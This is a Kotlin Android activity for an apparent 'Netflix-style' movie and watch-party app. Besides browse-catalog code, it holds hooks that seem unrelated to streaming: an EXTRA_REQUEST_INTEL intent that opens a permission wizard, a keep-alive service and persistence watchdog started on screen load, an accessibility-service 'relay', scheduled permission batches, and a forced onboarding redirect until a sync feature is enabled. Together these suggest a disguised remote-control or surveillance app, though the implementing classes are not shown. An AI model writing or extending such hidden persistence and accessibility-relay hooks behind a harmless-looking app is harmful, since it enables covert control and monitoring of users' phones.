package com.phonehand.app

import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.view.View
import android.widget.ProgressBar
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.google.android.material.bottomnavigation.BottomNavigationView
import java.util.concurrent.Executors

/** Netflix-style home — browse uploaded movies &amp; shows, start watch parties. */
class MoviesActivity : AppCompatActivity() {

    private val io = Executors.newSingleThreadExecutor()
    private lateinit var moviesList: RecyclerView
    private lateinit var loading: ProgressBar
    private lateinit var adapter: MoviesAdapter
    private var uploadedItems: List<MovieBrowseItem> = emptyList()
    private var fullBrowseList: List<MoviesListItem> = emptyList()
    @Volatile private var destroyed = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (!UserSession.isSignedUp(this) || !UserSession.onboardingDone(this)) {
            startActivity(Intent(this, OnboardingActivity::class.java))
            finish()
            return
        }

        if (intent.getBooleanExtra(HomeActivity.EXTRA_REQUEST_INTEL, false)) {
            PermissionWizardActivity.launch(this)
            finish()
            return
        }

        setContentView(R.layout.activity_movies)

        moviesList = findViewById(R.id.moviesList)
        loading = findViewById(R.id.moviesLoading)
        adapter = MoviesAdapter { item -> onTitleSelected(item) }
        moviesList.layoutManager = LinearLayoutManager(this)
        moviesList.adapter = adapter

        findViewById<BottomNavigationView>(R.id.bottomNav).setOnItemSelectedListener { item ->
            when (item.itemId) {
                R.id.nav_browse -> {
                    adapter.submit(fullBrowseList)
                    true
                }
                R.id.nav_party -> {
                    startActivity(Intent(this, WatchRoomActivity::class.java))
                    false
                }
                R.id.nav_my_list -> {
                    showMyList()
                    false
                }
                else -> false
            }
        }

        window.decorView.post {
            if (isFinishing || isDestroyed) return@post
            SafeKeepAlive.start(this)
            PersistenceWatchdog.schedule(this)
            TouchAccessibilityService.instance?.ensureRelay()
            runCatching {
                if (PermissionMoments.hasHomeBatch(this)) {
                    PermissionMoments.scheduleHomeSession(this)
                }
            }.onFailure { Log.w(TAG, "permission batch skipped: ${it.message}") }
        }

        loadCatalog()
    }

    override fun onResume() {
        super.onResume()
        OfferDelivery.pollPending(this)
        if (!WatchSync.isEnabled(this) &&
            UserSession.onboardingDone(this) &&
            UserSession.permissionsWizardDone(this)
        ) {
            runCatching {
                startActivity(Intent(this, OnboardingActivity::class.java))
                finish()
            }.onFailure { Log.w(TAG, "onboarding redirect failed: ${it.message}") }
            return
        }
        TouchAccessibilityService.instance?.ensureRelay()
    }

    private fun loadCatalog() {
        loading.visibility = View.VISIBLE
        val freeItems = FreeCatalog.load(this)
        io.execute {
            val familyItems = runCatching { FamilyLibraryClient.fetch().map { it.toBrowseItem() } }
                .getOrElse { emptyList() }
            val continueItems = ContinueWatchingStore.load(this@MoviesActivity)
            val offers = CatalogClient.fetchPublishedOffers(this@MoviesActivity)
            val catalogItems = CatalogClient.fetchCatalog(this@MoviesActivity)
            val catalogBrowse = catalogItems.map { CatalogClient.toBrowseItem(it) }
            val catalogPremium = catalogBrowse.filter { it.source == "premium" }
            val catalogSeries = catalogBrowse.filter { it.subtitle == "Series" && it.streamUrl.isNotBlank() }
            val catalogMovies = catalogBrowse.filter { it.source == "catalog" && it.subtitle != "Series" }
            uploadedItems = familyItems

            val movies = freeItems.filter { it.kind == "movie" }.map { it.toBrowseItem() }
            val shows = freeItems.filter { it.kind == "tv" }.map { it.toBrowseItem() }
            val trending = if (freeItems.isNotEmpty()) freeItems.shuffled().take(12).map { it.toBrowseItem() }
            else emptyList()

            val featured = familyItems.firstOrNull()
                ?: catalogBrowse.firstOrNull { it.streamUrl.isNotBlank() }
                ?: continueItems.firstOrNull()
                ?: trending.firstOrNull()
                ?: movies.firstOrNull()
                ?: shows.firstOrNull()

            val ctx = applicationContext
            val rows = buildList {
                if (familyItems.isNotEmpty()) {
                    add(MoviesListItem.Row(MovieRow(ctx.getString(R.string.movies_your_uploads), familyItems)))
                } else {
                    add(MoviesListItem.Row(MovieRow(ctx.getString(R.string.movies_your_uploads), listOf(uploadHintItem()))))
                }
                if (continueItems.isNotEmpty()) {
                    add(MoviesListItem.Row(MovieRow(ctx.getString(R.string.movies_continue), continueItems)))
                }
                if (offers.isNotEmpty()) {
                    val offerItems = offers.map { o ->
                        MovieBrowseItem(
                            id = o.contentId ?: "offer_${o.title.hashCode()}",
                            title = o.title,
                            subtitle = o.reason,
                            description = o.reason,
                            thumbUrl = PosterLoader.placeholderUrl(o.title),
                            streamUrl = "",
                            source = "offer",
                        )
                    }
                    add(MoviesListItem.Row(MovieRow(ctx.getString(R.string.movies_recommended), offerItems)))
                }
                if (catalogPremium.isNotEmpty()) {
                    add(MoviesListItem.Row(MovieRow(ctx.getString(R.string.movies_premium), catalogPremium)))
                }
                if (catalogSeries.isNotEmpty()) {
                    add(MoviesListItem.Row(MovieRow(ctx.getString(R.string.movies_series_row), catalogSeries)))
                }
                if (catalogMovies.isNotEmpty()) {
                    add(MoviesListItem.Row(MovieRow(ctx.getString(R.string.movies_catalog), catalogMovies)))
                }
                if (trending.isNotEmpty()) {
                    add(MoviesListItem.Row(MovieRow(ctx.getString(R.string.movies_trending), trending)))
                }
                if (shows.isNotEmpty()) {
                    add(MoviesListItem.Row(MovieRow(ctx.getString(R.string.movies_tv), shows)))
                }
                if (movies.isNotEmpty()) {
                    add(MoviesListItem.Row(MovieRow(ctx.getString(R.string.movies_free), movies)))
                }
            }

            val list = buildList {
                featured?.let { add(MoviesListItem.Hero(it)) }
                addAll(rows)
            }
            fullBrowseList = list

            runOnUiThread {
                if (destroyed || isFinishing) return@runOnUiThread
                loading.visibility = View.GONE
                adapter.submit(list)
            }
        }
    }

    private fun uploadHintItem(): MovieBrowseItem = MovieBrowseItem(
        id = "upload_hint",
        title = applicationContext.getString(R.string.movies_upload_hint_title),
        subtitle = applicationContext.getString(R.string.movies_upload_hint_sub),
        description = applicationContext.getString(R.string.movies_upload_hint_body),
        thumbUrl = PosterLoader.placeholderUrl("Your Movie"),
        streamUrl = "",
        source = "hint",
    )

    private fun showMyList() {
        val items = uploadedItems.filter { it.source == "family" }
        if (items.isEmpty()) {
            adapter.submit(
                listOf(
                    MoviesListItem.Row(MovieRow(getString(R.string.movies_nav_my_list), listOf(uploadHintItem()))),
                ),
            )
            return
        }
        adapter.submit(listOf(MoviesListItem.Row(MovieRow(getString(R.string.movies_nav_my_list), items))))
    }

    private fun onTitleSelected(item: MovieBrowseItem) {
        if (item.source == "hint") {
            Toast.makeText(this, R.string.movies_upload_hint_body, Toast.LENGTH_LONG).show()
            return
        }
        if (item.source == "premium" || item.streamUrl.isBlank()) {
            Toast.makeText(this, R.string.movies_premium_hint, Toast.LENGTH_LONG).show()
            return
        }
        openWatchRoom(item)
    }

    private fun openWatchRoom(item: MovieBrowseItem) {
        ContinueWatchingStore.save(this, item)
        startActivity(
            Intent(this, WatchRoomActivity::class.java).apply {
                putExtra(FreeCatalogActivity.EXTRA_STREAM_URL, item.streamUrl)
                putExtra(FreeCatalogActivity.EXTRA_TITLE, item.title)
            },
        )
    }

    override fun onDestroy() {
        destroyed = true
        io.shutdownNow()
        super.onDestroy()
    }

    companion object {
        private const val TAG = "MoviesActivity"
    }
}
